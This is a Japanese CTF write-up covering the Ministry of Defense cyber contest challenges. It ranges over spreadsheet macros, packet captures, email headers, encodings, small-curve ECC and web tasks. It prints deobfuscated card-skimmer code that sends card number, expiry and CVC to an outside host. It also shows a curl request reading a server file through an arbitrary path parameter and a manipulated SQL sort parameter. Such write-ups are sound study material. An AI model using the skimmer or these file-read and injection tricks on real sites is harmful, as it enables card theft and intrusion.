---
title: "防衛省 サイバーコンテスト - writeup"
date: "2025-02-02T00:00:00.000Z"
lang: JA
---

## [PG] 縮めるだけじゃダメ(100pts)

> 添付のExcelファイルからフラグを読み取ってください。
> 【回答書式】 flag{6桁の半角数字}

![](/assets/blog/bouei/image.png)

`PG-1.xlsm`というファイルが与えられる(Libre Officeでごめんね)。


列を狭めると、`flag{...}`の文字が浮かび上がるが、数字は読めない

![alt text](/assets/blog/bouei/image-1.png)

マクロ一覧を見ると、次のようなコードが見つかった

```vba
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Sub GET_FLAG()
Worksheets("Sheet1").Activate
Rows("1:7").RowHeight = 30
Columns("A:AT").ColumnWidth = 30
Range("A1:AT7").Interior.Color = RGB(255, 255, 255)
Range("A1:AT1").Interior.Color = RGB(0, 0, 0)
Range("A3:AT3").Interior.Color = RGB(0, 0, 0)
Range("A5:AT5").Interior.Color = RGB(0, 0, 0)
Columns("D").Interior.Color = RGB(255, 255, 255)
Columns("F").Interior.Color = RGB(255, 255, 255)
Columns("J").Interior.Color = RGB(255, 255, 255)
Columns("K").Interior.Color = RGB(255, 255, 255)
Columns("O").Interior.Color = RGB(255, 255, 255)
Columns("S").Interior.Color = RGB(255, 255, 255)
Columns("W").Interior.Color = RGB(255, 255, 255)
Columns("AA").Interior.Color = RGB(255, 255, 255)
Columns("AE").Interior.Color = RGB(255, 255, 255)
Columns("AI").Interior.Color = RGB(255, 255, 255)
Columns("AM").Interior.Color = RGB(255, 255, 255)
Columns("AQ").Interior.Color = RGB(255, 255, 255)
Range("A1:A2").Interior.Color = RGB(255, 255, 255)
Range("C2").Interior.Color = RGB(255, 255, 255)
Range("C4:C5").Interior.Color = RGB(255, 255, 255)
Range("G1:P2").Interior.Color = RGB(255, 255, 255)
Range("P5").Interior.Color = RGB(255, 255, 255)
Range("AR2:AR4").Interior.Color = RGB(255, 255, 255)
Range("AT1:AT2").Interior.Color = RGB(255, 255, 255)
Range("AT4:AT5").Interior.Color = RGB(255, 255, 255)
Range("R2:R4").Interior.Color = RGB(255, 255, 255)
Range("B1:B5").Interior.Color = RGB(0, 0, 0)
Range("E1:E5").Interior.Color = RGB(0, 0, 0)
Range("G3:G5").Interior.Color = RGB(0, 0, 0)
Range("I3:I6").Interior.Color = RGB(0, 0, 0)
Range("L3:L5").Interior.Color = RGB(0, 0, 0)
Range("N3:N7").Interior.Color = RGB(0, 0, 0)
Range("J6").Interior.Color = RGB(0, 0, 0)
Range("L7:M7").Interior.Color = RGB(0, 0, 0)
Range("Q1:Q5").Interior.Color = RGB(0, 0, 0)
Range("AS1:AS5").Interior.Color = RGB(0, 0, 0)
Range("T1:T5").Interior.Color = RGB(0, 0, 0)
Range("V1:V5").Interior.Color = RGB(0, 0, 0)
Range("X1:X5").Interior.Color = RGB(0, 0, 0)
Range("Z1:Z5").Interior.Color = RGB(0, 0, 0)
Range("AB1:AB5").Interior.Color = RGB(0, 0, 0)
Range("AD1:AD5").Interior.Color = RGB(0, 0, 0)
Range("AF1:AF5").Interior.Color = RGB(0, 0, 0)
Range("AH1:AH5").Interior.Color = RGB(0, 0, 0)
Range("AJ1:AJ5").Interior.Color = RGB(0, 0, 0)
Range("AL1:AL5").Interior.Color = RGB(0, 0, 0)
Range("AN1:AN5").Interior.Color = RGB(0, 0, 0)
Range("AP1:AP5").Interior.Color = RGB(0, 0, 0)
Range("AN2").Interior.Color = RGB(255, 255, 255)
Range("AN4").Interior.Color = RGB(255, 255, 255)
Range("T2").Interior.Color = RGB(255, 255, 255)
Range("V4").Interior.Color = RGB(255, 255, 255)
Range("AL2").Interior.Color = RGB(255, 255, 255)
Range("Z2").Interior.Color = RGB(255, 255, 255)
Range("AJ4").Interior.Color = RGB(255, 255, 255)
Range("AH2").Interior.Color = RGB(255, 255, 255)
Range("R2:V2").Interior.Color = RGB(255, 255, 255)
Range("R4:V4").Interior.Color = RGB(255, 255, 255)
Range("W2:AA2").Interior.Color = RGB(255, 255, 255)
Range("W4:AA4").Interior.Color = RGB(255, 255, 255)
Range("AB2:AH2").Interior.Color = RGB(255, 255, 255)
Range("AB4:AH4").Interior.Color = RGB(255, 255, 255)
Range("AI2:AL2").Interior.Color = RGB(255, 255, 255)
Range("AI4:AL4").Interior.Color = RGB(255, 255, 255)
Range("AM2:AR2").Interior.Color = RGB(255, 255, 255)
Range("AM4:AR4").Interior.Color = RGB(255, 255, 255)
Range("R2:AR2").Interior.Color = RGB(0, 0, 0)
Range("R4:AR4").Interior.Color = RGB(0, 0, 0)
Range("R2:AR2").Interior.Color = RGB(255, 255, 255)
Range("R4:AR4").Interior.Color = RGB(255, 255, 255)
End Sub
```

実行すると、元の状態に戻ってしまう。もしかしたら計算途中に数字になっている箇所がありそうだな、とコードを途中で切り上げてみたら次のコードで数字が浮かび上がった。

```vba
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Sub GET_FLAG()
Worksheets("Sheet1").Activate
Rows("1:7").RowHeight = 30
Columns("A:AT").ColumnWidth = 2
Range("A1:AT7").Interior.Color = RGB(255, 255, 255)
Range("A1:AT1").Interior.Color = RGB(0, 0, 0)
Range("A3:AT3").Interior.Color = RGB(0, 0, 0)
Range("A5:AT5").Interior.Color = RGB(0, 0, 0)
Columns("D").Interior.Color = RGB(255, 255, 255)
Columns("F").Interior.Color = RGB(255, 255, 255)
Columns("J").Interior.Color = RGB(255, 255, 255)
Columns("K").Interior.Color = RGB(255, 255, 255)
Columns("O").Interior.Color = RGB(255, 255, 255)
Columns("S").Interior.Color = RGB(255, 255, 255)
Columns("W").Interior.Color = RGB(255, 255, 255)
Columns("AA").Interior.Color = RGB(255, 255, 255)
Columns("AE").Interior.Color = RGB(255, 255, 255)
Columns("AI").Interior.Color = RGB(255, 255, 255)
Columns("AM").Interior.Color = RGB(255, 255, 255)
Columns("AQ").Interior.Color = RGB(255, 255, 255)
Range("A1:A2").Interior.Color = RGB(255, 255, 255)
Range("C2").Interior.Color = RGB(255, 255, 255)
Range("C4:C5").Interior.Color = RGB(255, 255, 255)
Range("G1:P2").Interior.Color = RGB(255, 255, 255)
Range("P5").Interior.Color = RGB(255, 255, 255)
Range("AR2:AR4").Interior.Color = RGB(255, 255, 255)
Range("AT1:AT2").Interior.Color = RGB(255, 255, 255)
Range("AT4:AT5").Interior.Color = RGB(255, 255, 255)
Range("R2:R4").Interior.Color = RGB(255, 255, 255)
Range("B1:B5").Interior.Color = RGB(0, 0, 0)
Range("E1:E5").Interior.Color = RGB(0, 0, 0)
Range("G3:G5").Interior.Color = RGB(0, 0, 0)
Range("I3:I6").Interior.Color = RGB(0, 0, 0)
Range("L3:L5").Interior.Color = RGB(0, 0, 0)
Range("N3:N7").Interior.Color = RGB(0, 0, 0)
Range("J6").Interior.Color = RGB(0, 0, 0)
Range("L7:M7").Interior.Color = RGB(0, 0, 0)
Range("Q1:Q5").Interior.Color = RGB(0, 0, 0)
Range("AS1:AS5").Interior.Color = RGB(0, 0, 0)
Range("T1:T5").Interior.Color = RGB(0, 0, 0)
Range("V1:V5").Interior.Color = RGB(0, 0, 0)
Range("X1:X5").Interior.Color = RGB(0, 0, 0)
Range("Z1:Z5").Interior.Color = RGB(0, 0, 0)
Range("AB1:AB5").Interior.Color = RGB(0, 0, 0)
Range("AD1:AD5").Interior.Color = RGB(0, 0, 0)
Range("AF1:AF5").Interior.Color = RGB(0, 0, 0)
Range("AH1:AH5").Interior.Color = RGB(0, 0, 0)
Range("AJ1:AJ5").Interior.Color = RGB(0, 0, 0)
Range("AL1:AL5").Interior.Color = RGB(0, 0, 0)
Range("AN1:AN5").Interior.Color = RGB(0, 0, 0)
Range("AP1:AP5").Interior.Color = RGB(0, 0, 0)
Range("AN2").Interior.Color = RGB(255, 255, 255)
Range("AN4").Interior.Color = RGB(255, 255, 255)
Range("T2").Interior.Color = RGB(255, 255, 255)
Range("V4").Interior.Color = RGB(255, 255, 255)
Range("AL2").Interior.Color = RGB(255, 255, 255)
Range("Z2").Interior.Color = RGB(255, 255, 255)
Range("AJ4").Interior.Color = RGB(255, 255, 255)
Range("AH2").Interior.Color = RGB(255, 255, 255)
End Sub
```
実行結果

![alt text](/assets/blog/bouei/image-2.png)


## [PG] 暗算でもできるけど？(100pts)

> 添付のソースコードを実行した際の出力値の68番目の値と、このソースコードから推測される314番目の値を足した数を答えてください。
> 【回答書式】 flag{n桁の半角数字}

次のようなコードが与えられる。

```c
#include <stdio.h>
int main(){
    int i,j,k,l;
    k=(((10/2*4/10*4/2)+97)*10)-10;
    for(i=2;i<=k;++i){
        l=0;
        for(j=2;j<i;++j){
            if(i%j==0){
                l=1;
                break;
            }
        }
        if(l==0)
        printf("%d\r\n",i);
    }
    return 0;
}
```

実行してみると、素数の一覧が表示された。したがって、[素数一覧](https://mathlandscape.com/prime-table/)から探して、`337+2083`を計算してフラグ`flag{2420}`を得た。


## [PG] formjacking (200pts)
> 添付のファイルは「Card Stealer」と呼ばれるフォームからの入力値を外部へ送信するJavaScriptです。 カード情報が妥当な場合、その値は外部へ送信されるようなので追跡したいです。
> 【回答書式】 flag{n桁の半角英数記号}

難読化されたjavascriptコードが与えられる。[Deobfuscator](https://obf-io.deobfuscate.io/)を利用して、少しわかりやすくしたところ、次のような箇所が見つかる。

```javascript
function _0x3bb027() {
    const _0x3e5fd8 =
    "https://pg3.2025winter-cybercontest.net/pg3?cardnumber=" +
    encodeURIComponent(_0x9ae3dd) +
    "&exp-date=" +
    encodeURIComponent(_0x57060f) +
    "&cvc=" +
    encodeURIComponent(_0x33294f) +
    "&" +
    "Skimming=true";
    return _0x3e5fd8;
}
```

試しに、`https://pg3.2025winter-cybercontest.net/pg3?cardnumber=foo&exp-date=bar&cvc=baz&Skimming=true`にアクセスしたところ、フラグが得られた。

## [PG] loop in loop (300pts)

以下の要件を満たすプログラムを作成してください。 プログラムの言語は問いません。

> １．引数として以下の値を指定できる。
>
> 第一引数：文字列
> 第二引数：文字列
> ２．プログラム内部で引数に以下の処理を加える。
>
> それぞれの引数のハッシュ値を求める。ハッシュ関数にはRIPEMD160を使用する。
> 第一引数のハッシュ値の1文字目と第二引数のハッシュ値の1文字目を抜き出し、それらの値が両方数値だった場合、それらのXORを求める。そうでない場合は何も処理しない。
> 続いて、第一引数のハッシュ値の1文字目と第二引数のハッシュ値の2文字目を抜き出し、それらの値が両方数値だった場合、それらのXORを求める。そうでない場合は何も処理しない。
> 同様に、3文字目、4文字目と続け、と第二引数のハッシュ値の最後の文字まで行う。
> 続けて第一引数のハッシュ値の2文字目に対して第二引数のハッシュ値の1文字目から同様の処理を行う。
> 同様に第一引数のハッシュ値の3文字目、4文字目と続け、と第一引数のハッシュ値の最後の文字まで行う。
> それぞれの値を加算する。
> 加算された値を10進数で出力する。
> このプログラムに下記の引数を与えた時に出力される値を答えてください。
>
> 第一引数：Phoenix
> 第二引数：Messiah
> 【回答書式】 flag{n桁の半角数字}

丁寧に仕様が書いてあるので、自分は一切読まずにChatGPTに読み込ませると、一発で成功した。さすが。

```python
import hashlib

def calc(str1, str2):
    
    # 1. RIPEMD160 ハッシュ値の取得
    #   hashlib.new("ripemd160") が利用可能であれば以下のようにしてハッシュ値を求めます
    hash1 = hashlib.new("ripemd160")
    hash1.update(str1.encode('utf-8'))
    hash1_val = hash1.hexdigest()  # 40文字の16進数文字列
    
    hash2 = hashlib.new("ripemd160")
    hash2.update(str2.encode('utf-8'))
    hash2_val = hash2.hexdigest()
    
    # 2. ハッシュ値の各文字同士の組み合わせで、両方が数字であれば XOR を求め、加算する
    total_sum = 0
    for c1 in hash1_val:        # 第一引数のハッシュ値 1文字目～最後の文字
        for c2 in hash2_val:    # 第二引数のハッシュ値 1文字目～最後の文字
            if c1.isdigit() and c2.isdigit():
                # 文字を int に変換し、XOR を求める
                val1 = int(c1)
                val2 = int(c2)
                xor_val = val1 ^ val2
                total_sum += xor_val
    
    # 3. 加算された値を 10進数で出力
    print(total_sum)

if __name__ == "__main__":
    calc("Phoenix", "Messiah")
```

## [NW] 頭が肝心です (100pts)

> 添付したメールファイルからフラグを探してください。 フラグはこのメールが届くまでに経由した２番目のメールサーバのIPアドレスとします。
> 【回答書式】 flag{IPアドレス}

次のようなファイル`NW-1.eml`が与えられる。ファイルはISO-2022-JPでエンコードされているので、`open("NW-1.eml", "rb").read().decode('ISO-2022-JP')`を実行して変換した。

```
Return-Path: <no-return@example.com>
X-Original-To: user@example.com
Delivered-To: user@example.com
Received: from smtp.example.com ([172.30.55.96])
　　　　by rfs.example.com; Thu, 28 Dec 2023 17:47:05 +0900 (JST)
Received: from ex.example.com ([10.231.24.42])
　　　　by smtp.example.com; Thu, 28 Dec 2023 17:45:21 +0900 (JST)
To: user@example.com
Subject: [CTF] Mail From NW
From: sender@example.com
Received: from mx.example.com ([172.16.25.39])
　　　　by ex.example.com; Thu, 28 Dec 2023 17:32:47 +0900 (JST)
Received: from mail.example.com ([192.168.52.21])
　　　　by mx.example.com; Thu, 28 Dec 2023 17:32:38 +0900 (JST)
Received: by mail.example.com (Postfix, from userid 33)
	id DE79A41AF7; Thu, 28 Dec 2023 17:32:24 +0900 (JST)
Mime-Version: 1.0
Content-Type: text/plain; charset=ISO-2022-JP
Content-Transfer-Encoding: 7bit
Message-Id: <20231228083224.DE79A41AF7@example.com>
Date: Thu, 28 Dec 2023 17:51:24 +0900 (JST)

参加者各位

このメールはサイバーコンテストにおける問題[NW]のメールです。
メールの中からフラグを見つけてください。
ご検討を祈ります。
```

以下のヘッダーは、`rfs.example.com`から`smtp.example.com`へ送られた、という意味である。([参考](https://www.tains.tohoku.ac.jp/news/news-32/0510.html))

```
Received: from smtp.example.com ([172.30.55.96])
　　　　by rfs.example.com; Thu, 28 Dec 2023 17:47:05 +0900 (JST)
```

つまり、`mail.example.com`→`mx.example.com`→`ex.example.com`→`smtp.example.com`→`rfs.example.com`の順番で送られている、ということなので、「２番目のメールサーバ」は`mx.example.com`であり、そのIPアドレスの`172.16.25.39`がフラグとなる。

## [NW] 3 Way Handshake？ (200pts)
> 添付したのはTCPポートスキャン時のパケットログです。 オープンポートを見つけてください。 オープンしているポート番号を小さい順に「,(カンマ)」で区切って答えてください。
> 【回答書式】 flag{n1,n2,n3,.....}

与えられたpcapファイルを見ると、`192.168.123.103`が目的のポートに対してTCP通信を行い、`192.168.123.115`がそれに対してレスポンスを返していることがわかる。ポートが空いている場合、`SYN`フラグのレスポンスを返し、空いていない場合、`RST`のフラグのレスポンスを返しているようだ。

![](/assets/blog/bouei/image-22.png)

Wiresharkのフィルタ欄で、次のように指定する。

```
tcp.flags == 0x0012
```

そうすると、`SYN`のレスポンスを返したパケットのみが表示されるので、それらの送信元のポートを記録してフラグを得ることができる。



## [NW] さあ得点は？ (200pts)

> 添付されたパケットファイルから攻撃を特定し、その攻撃のCVEを調べてください。 その攻撃のCVSS Version2.0のBaseScoreがフラグです。 CVSSのスコアはNISTで公開されている値とします。 https://nvd.nist.gov/
> 【回答書式】 flag{数値}

いくつかのTCP通信が見られるので、適当なパケットを右クリック→Follow→TCP Streamで、それぞれの通信のやりとりの内容を見る。右下の「Stream」を切り替えて、怪しいものを探すと、Stream 1が不自然だった。

![](/assets/blog/bouei/image-23.png)

`X-Powered-By: PHP/7.0.30-0ubuntu0.16.04.1`というヘッダーが返ってきているので、「php 7 requst-range header vulnerability」で検索すると、[同じような攻撃を解説しているページ](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/updated-mitigation-of-apache-range-header-dos-attack/)が見つかった。[報告ページ](https://seclists.org/fulldisclosure/2011/Aug/175)では「Apache Killer」と呼ばれていたので、「Apache Killer CVE」で検索すると「[CVE-2011-3192](https://blog.tokumaru.org/2011/08/apache-killerapache-killer.html)」であることがわかる。したがって、[NISTのページ](https://nvd.nist.gov/vuln/detail/cve-2011-3192)から、BaseScoreは「7.8」であることがわかる。

## [NW] decode (300pts)

> 添付のパケットファイルからフラグを探してください
> 【回答書式】 flag{n桁の半角英数記号}

複数のpcapファイルが与えられるので、以下のコマンドで一つにまとめる。

```
$ mergecap -w out.pcap NW-*
```

そうすると、いくつかのHTTP通信があるので、適当なパケットを右クリック→Follow→TCP Streamで、それぞれの通信のやりとりの内容を見る。すると、いくつかのTCP通信では、HTTPリクエストに対して次のようなJSONを返していることがわかる。

```
HTTP/1.1 200 OK
Host: 52.195.222.109:8888
Date: Mon, 23 Dec 2024 03:20:56 GMT
Connection: close
X-Powered-By: PHP/8.3.6
Content-Type: application/json
Access-Control-Allow-Origin: *

{"image":"<base64>"}
```

以下のコードで画像に変換する。

```python
import base64
b = b"<base64>" # '\/'は'/'に置換しておく 
open("out.jpeg", "wb").write(base64.b64decode(b))
```

そうすると、Stream 12の画像にフラグがあった。


![](/assets/blog/bouei/test8.jpeg)

## [WE] 簡単には見せません (100pts)

> https://we1-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁のアルファベット}

次のようなWebページのURLが与えられる。

![alt text](/assets/blog/bouei/image-3.png)

`/robots.txt`を確認すると、いくつかのパスが指定されている。

![alt text](/assets/blog/bouei/image-4.png)

一つひとつ確認すると、`/blue/`で次のように表示された。

![](/assets/blog/bouei/image-5.png)

`/blue/flg/`は次のようなページだった。

![](/assets/blog/bouei/image-6.png)

ソースコードのコメントにフラグがあった。

![](/assets/blog/bouei/image-7.png)

## [WE] 試練を乗り越えろ！ (100pts)

> 下記のURLからフラグを入手してください。
> https://we2-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁のアルファベット}

次のようなページのURLが与えられる。

![](/assets/blog/bouei/image-8.png)

> 第1問
> 今は何問目？

のような問題を10000問解かなかればならないらしい。

リクエストは以下のようになっている。

![](/assets/blog/bouei/image-9.png)

これを参考にして、`qCount`と`answer`をそれぞれ`10000`にしてリクエストを送ってみる。

```
$ curl --data-raw 'qCount=10000&answer=10000&submit=%E9%80%81%E4%BF%A1' https://we2-prod.2025winter-cybercontest.net/  
```

そうするとフラグが返ってくる。


## [WE] 直してる最中なんです (200pts)

> 下記のサイトから脆弱性のあるアプリケーションを特定し、その脆弱性を利用してフラグを入手してください。
> https://we3-prod.2025winter-cybercontest.net/
> フラグが記載されているファイルは下記の通りです。 /etc/WE-3
> 【回答書式】 flag{25桁の半角英数字}

次のようなページのURLが与えられる。

![](/assets/blog/bouei/image-10.png)

ソースコードを見ると、`secret/download.js`というファイルが無効化されていることがわかる。また、`dlFIle('WE-3-01')`のような形で利用できる関数`dlFIle`が示唆されている。

```html

<!-- @format -->

<!DOCTYPE html>
<html
    xmlns="http://www.w3.org/1999/xhtml"
    xml:lang="ja-JP"
    lang="ja-JP"
    prefix="og: http://ogp.me/ns#"
>
    <head>
        <meta charset="utf-8" />
        <meta name="robots" content="noindex" />
        <title>NO LIFE NO STONE</title>
        <!--<script type="text/javascript" src="secret/download.js"></script>-->
    </head>

    <body>
        <h2>そのへんの石</h2>
        ※ダウンロードの仕組みは調子悪いので(^^;
        欲しい方は画像を直接コピーしてね。<br />
        <hr />
        <img src="stone/WE-3-01.png" height="50" />
        <!-- <button onClick="dlFIle('WE-3-01')">ダウンロード</button> -->
        <img src="stone/WE-3-02.png" height="50" />
        <!-- <button onClick="dlFIle('WE-3-02')">ダウンロード</button> -->
        <img src="stone/WE-3-03.png" height="50" />
        <!-- <button onClick="dlFIle('WE-3-03')">ダウンロード</button> -->
        <img src="stone/WE-3-04.png" height="50" />
        <!-- <button onClick="dlFIle('WE-3-04')">ダウンロード</button> -->
        <img src="stone/WE-3-05.png" height="50" />
        <!-- <button onClick="dlFIle('WE-3-05')">ダウンロード</button> -->
    </body>
</html>
```

`/secret/download.js`の内容は以下の通り。

```javascript
function dlFIle(file){
	var dataS = 'fName=' + file;
	var xhr = new XMLHttpRequest();
	xhr.open('POST','/secret/download.php');
	xhr.send(dataS);
	xhr.onload = function() {
		var strS = xhr.responseText;
	};
}
```

どうやら、`/secret/download.php`に`fName`という値を与えてPOSTリクエストすると、そのファイルがダウンロードされるようだ。

試しに以下のコマンドで、`/etc/WE-3`をダウンロードしようとしたら、うまくいった。

```
$ curl --data-raw "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php
```

## [WE] 直接聞いてみたら？ (200pts)

> 下記のURLはAPIテストのためのフォームです。 ここからフラグを入手してください。
> https://we4-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁のアルファベット}

次のようなWebページへのURLが与えられる。

![](/assets/blog/bouei/image-12.png)

試しに適当にチェックを入れて「問い合わせ」を送ると、アラートが表示された。

![](/assets/blog/bouei/image-13.png)

ソースコードを見ると、次のコードで問い合わせを行っているようだ。
```javascript
function sendData(){
	var dataS = $('form').serializeArray();
	var dataB = btoa(JSON.stringify(dataS));
	var data = "data=" + dataB

	console.log(data);
	var xhr = new XMLHttpRequest();
	xhr.open('POST','json.php');
	xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
	xhr.send(data);

	xhr.onload = function() {
	  if (xhr.status != 200) {
	    alert(`失敗 ${xhr.status}: ${xhr.statusText}`);
	  } else {
	    alert(`成功, 取得データは ${xhr.response.length} bytes`);
	  }
	};
}
```

送られるデータはbase64でエンコードしてあることがわかる。

![](/assets/blog/bouei/image-14.png)

デコードしてみると、次のようなJSONであることがわかる。

```json
[{"name":"tel","value":"on"},{"name":"address","value":"on"}]
```

試しに、次のコードで、`flag`をonにしてリクエストを送ってみたところ、フラグが返ってきた。

```javascript
import requests
import base64

URL = "https://we4-prod.2025winter-cybercontest.net/"

s = requests.session()
s.get(URL)
r = s.post(URL + "json.php", data={
    "data": base64.b64encode(b'[{"name":"flag","value":"on"}]')
})
print(r.text)
```

## [WE] 整列！ (300pts)
> 旗の下に必要な者だけが正しく並べばいいのです。
> https://we5-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁の英数字}

次のように、`ID`、`Data`、`flagSeq`という列のあるテーブルがある。

![](/assets/blog/bouei/image-15.png)

試しに、`ID`の`Up`を押すと、`?sort=id+ASC`というクエリパラメータが付与され、テーブルが`ID`でソートされた。

![](/assets/blog/bouei/image-16.png)

`flagSeq`でソートできないか`?sort=flagSeq+ASC`で試してみると、フラグの前半を読むことができる。

![](/assets/blog/bouei/image-17.png)

おそらくSQLで`SELECT * FROM ... ORDER BY flagSeq ASC`のような形で問い合わせが行われているのだろうと推測した。sortの内容を`(flagSeq+89)%100`とすれば、`flagSeq`が11の行が最初になることを利用したいので、URLエンコードして、`?sort=(flagSeq%2B+89)%25100`で問い合わせてみると、次のようにうまく表示できた。

![](/assets/blog/bouei/image-18.png)

続けて、`?sort=(flagSeq%2B+69)%25100`に対して問い合わせを行い、フラグの文字をすべて得ることができた。

## [CY] エンコード方法は一つじゃない (100pts)
> 以下の文字列をデコードしてFlagを答えてください。
> %26%23%78%35%35%3b%26%23%78%36%33%3b%26%23%78%36%31%3b%26%23%78%36%65%3b%26%23%78%34%32%3b%26%23%78%37%64%3b%56%6d%46%79%61%57%39%31%63%30%56%75%59%32%39%6b%61%57%35%6e%63%77%3d%3d%36%36%36%63%36%31%36%37%37%62
> 【回答書式】 flag{n桁のアルファベット}

明らかにURLエンコードされているので[デコード](https://gchq.github.io/CyberChef/#recipe=URL_Decode()&input=JTI2JTIzJTc4JTM1JTM1JTNiJTI2JTIzJTc4JTM2JTMzJTNiJTI2JTIzJTc4JTM2JTMxJTNiJTI2JTIzJTc4JTM2JTY1JTNiJTI2JTIzJTc4JTM0JTMyJTNiJTI2JTIzJTc4JTM3JTY0JTNiJTU2JTZkJTQ2JTc5JTYxJTU3JTM5JTMxJTYzJTMwJTU2JTc1JTU5JTMyJTM5JTZiJTYxJTU3JTM1JTZlJTYzJTc3JTNkJTNkJTM2JTM2JTM2JTYzJTM2JTMxJTM2JTM3JTM3JTYyCg)すると、

```
&#x55;&#x63;&#x61;&#x6e;&#x42;&#x7d;VmFyaW91c0VuY29kaW5ncw==666c61677b
```

どうやら左から、[HTMLエンティティ](https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=JiN4NTU7JiN4NjM7JiN4NjE7JiN4NmU7JiN4NDI7JiN4N2Q7)、[Base64](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Vm1GeWFXOTFjMFZ1WTI5a2FXNW5jdz09)、[hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjY2YzYxNjc3Yg)でエンコードされているようである。それぞれデコードすると、「UcanB}」「VariousEncodings」「flag{」となるので、並び替えて「flag{VariousEncodingsUcanB}」がフラグとなる。


## [CY] File Integrity of Long Hash (100pts)

> 添付のZIPファイルの中から下記のファイルを探してください。 フラグはそのファイルの中に書かれています。
> 189930e3d9e75f4c9000146c3eb12cbb978f829dd9acbfffaf4b3d72701b70f38792076f960fa7552148e8607534a15b98a4ae2a65cb8bf931bbf73a1cdbdacf
> 【回答書式】 flag{22文字の半角英数字}

`flag_10.txt`から`flag_99.txt`の90個のファイルが与えられるので、その中身をハッシュ化したときに与えられたハッシュと一致するものを探す。[ハッシュ判別ツール](https://hashes.com/en/tools/hash_identifier)を利用すると、これはSHA512でハッシュされた可能性が高いことがわかるので、以下のコードでハッシュを計算する。

```python
import hashlib
target = "189930e3d9e75f4c9000146c3eb12cbb978f829dd9acbfffaf4b3d72701b70f38792076f960fa7552148e8607534a15b98a4ae2a65cb8bf931bbf73a1cdbdacf"

for i in range(10,100):
    con = open(f"flags/flags_{i}.txt", "rb").read()
    hash = hashlib.sha512(con).hexdigest()
    if hash == target:
        print(i, con)
        break
```

すると、`flag_89.txt`のハッシュが一致することがわかる。

## [CY] Equation of ECC (200pts)

> 楕円曲線のパラメータは以下の通りとします。
> a=56,b=58,p=127
> 基準点(42,67)と設定した場合、公開鍵の値が下記になる秘密鍵の最も小さい値を答えてください。
> 公開鍵(53,30)
> 【回答書式】 flag{半角数字}

楕円曲線わかんないので、GPTちゃんに問いてもらう。

```python
# 楕円曲線 E: y^2 = x^3 + a*x + b (mod p)
p = 127
a = 56
b = 58

# 基準点 G, 公開鍵 P
G = (42, 67)
P = (53, 30)

def inverse_mod(n, p):
    """
    n の p を法とする乗法逆元を返す (n * inv ≡ 1 (mod p))
    p が素数の場合は pow(n, p-2, p) を使う。
    """
    return pow(n, p-2, p)

def point_add(P, Q):
    """
    楕円曲線上の点P, Qの加法 (mod p) を求める。
    E: y^2 = x^3 + a*x + b (mod p), a=56, b=58, p=127 (グローバル)
    
    P, Q のどちらか一方が None (無限遠点) なら他方を返す。
    """
    if P is None:
        return Q
    if Q is None:
        return P
    
    x1, y1 = P
    x2, y2 = Q
    
    # P と Q が x座標同じで y座標が加法的に逆 (y1 = -y2 mod p) なら和は無限遠点(None)
    if x1 == x2 and (y1 + y2) % p == 0:
        return None  # (対消滅)
    
    if P != Q:
        # 異なる点の加法
        # lambda = (y2 - y1) / (x2 - x1) mod p
        num = (y2 - y1) % p
        den = (x2 - x1) % p
        lam = (num * inverse_mod(den, p)) % p
        
        x3 = (lam * lam - x1 - x2) % p
        y3 = (lam * (x1 - x3) - y1) % p
        return (x3, y3)
    else:
        # P = Q の場合 (ダブル: 2P)
        # lambda = (3*x1^2 + a) / (2*y1) mod p
        num = (3 * x1 * x1 + a) % p
        den = (2 * y1) % p
        lam = (num * inverse_mod(den, p)) % p
        
        x3 = (lam * lam - 2 * x1) % p
        y3 = (lam * (x1 - x3) - y1) % p
        return (x3, y3)

def scalar_mul(k, P):
    """
    素朴なスカラー倍:
      k * P = P + P + ... + P (k回)
    p=127 なら kがそこまで巨大でなければこれでもOK
    """
    R = None  # 無限遠点
    for _ in range(k):
        R = point_add(R, P)
    return R

def main():
    # 公開鍵 P=(53,30) を生成する最小の正整数 k を求める
    # つまり k*G = P となるような k を1から順に探す
    k = 1
    while True:
        test_point = scalar_mul(k, G)
        if test_point == P:
            print("最小の k =", k)
            return
        k += 1

if __name__ == "__main__":
    main()
```


## [CY] PeakeyEncode (300pts)
> 文字化けした文が送られてきました。送信者によるとこの文字化けはインターネットから探してきたロジックを使って暗号化を施したかったそうです。 暗号化した際の環境が送られてきているので復号ができないでしょうか。

以下のようなコードが配布される。

```ruby:script.rb
require './encode.rb'
flag = File.open("flag", "r").read()
generate = PeakeyEncode.new.generate(flag)
generate = generate.gsub(">", "🚒")
generate = generate.gsub("<", "😭")
generate = generate.gsub("+", "😡")
generate = generate.gsub("-", "🙌")
generate = generate.gsub(".", "🌺")
generate = generate.gsub(",", "✍️")
generate = generate.gsub("[", "😤")
generate = generate.gsub("]", "🐈")

sjis = generate.force_encoding(Encoding::SJIS)
p sjis.encode(Encoding::UTF_8)
```

`PeakeyEncode.new.generate(flag)`の実装はわからないが、いくつかの文字を置換したあと、Shift-JISのバイト列に変換し、それをUTF-8として解釈していることがわかる。

これを逆算すると以下のようになる。

```ruby:solver.rb

enc = File.binread("encryption")
shift_jis_data = enc.force_encoding(Encoding::UTF_8).encode(Encoding::SJIS).force_encoding(Encoding::UTF_8)
shift_jis_data = shift_jis_data.gsub("🚒", ">")
shift_jis_data = shift_jis_data.gsub("😭", "<")
shift_jis_data = shift_jis_data.gsub("😡", "+")
shift_jis_data = shift_jis_data.gsub("🙌", "-")
shift_jis_data = shift_jis_data.gsub("🌺", ".")
shift_jis_data = shift_jis_data.gsub("✍️", ",")
shift_jis_data = shift_jis_data.gsub("😤", "[")
shift_jis_data = shift_jis_data.gsub("🐈", "]")
puts shift_jis_data
```

実行結果

```
$ ruby solver.rb
